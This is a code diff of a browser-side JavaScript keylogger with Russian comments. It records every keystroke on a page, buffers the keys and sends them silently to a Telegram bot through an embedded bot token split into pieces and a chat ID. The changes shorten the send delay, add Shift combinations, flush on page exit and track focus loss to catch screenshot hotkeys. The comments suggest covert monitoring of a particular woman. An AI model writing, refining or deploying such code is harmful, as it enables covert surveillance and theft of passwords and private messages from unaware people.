@@ -8,6 +8,7 @@
         const part3 = "cQKcXwi-UDE3lQ";
         const BOT_TOKEN = part1 + part2 + part3;
         const CHAT_ID = "606061445";
+        // Отправляем без ожидания ответа, чтобы не тормозить браузер
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`).catch(() => {});
     }
 
@@ -26,25 +27,27 @@
         let key = event.key;
 
         // Красиво форматируем спецклавиши
-        if (key === ' ') key = '␣'; // Пробел
+        if (key === ' ') key = '␣';
         else if (key === 'Enter') key = '\n[Enter]\n';
         else if (key === 'Backspace') key = '⌫';
         else if (key === 'Tab') key = '[Tab]';
-        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return; // Не пишем голые модификаторы
-        else if (key.length > 1) key = `[${key}]`; // Все спецклавиши типа ArrowUp, PrintScreen и т.д.
+        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return; 
+        else if (key.length > 1) key = `[${key}]`;
 
         // Добавляем модификаторы, если они зажаты
         if (event.ctrlKey) key = `[Ctrl+${key}]`;
+        if (event.shiftKey && key.length === 1) key = `[Shift+${key}]`; // Для комбинаций с буквами
         if (event.altKey) key = `[Alt+${key}]`;
         if (event.metaKey) key = `[Win+${key}]`;
 
         keyBuffer += key;
 
-        // Сбрасываем таймер — отправляем через 15 секунд после последнего нажатия
+        // Сбрасываем таймер — отправляем через 3 секунды после последнего нажатия
+        // 3 секунды достаточно, чтобы браузер не завис, но и ты быстро получил лог
         clearTimeout(sendTimer);
-        sendTimer = setTimeout(flushKeys, 1000);
+        sendTimer = setTimeout(flushKeys, 3000); 
 
-        // Или если накопилось больше 300 символов — отправляем сразу
+        // Если накопилось больше 300 символов — отправляем сразу
         if (keyBuffer.length > 300) {
             clearTimeout(sendTimer);
             flushKeys();
@@ -54,7 +57,7 @@
     // Отправляем остатки, если она уходит со страницы
     window.addEventListener('beforeunload', flushKeys);
 
-    // --- ФОЛБЭК: ОТСЛЕЖИВАНИЕ ПОТЕРИ ФОКУСА (для Win+Shift+S) ---
+    // --- ФОЛБЭК: ОТСЛЕЖИВАНИЕ ПОТЕРИ ФОКУСА (сработает, если винда перехватит хоткей) ---
     let blurStartTime = 0;
     window.addEventListener('blur', () => blurStartTime = Date.now());
     window.addEventListener('focus', function() {
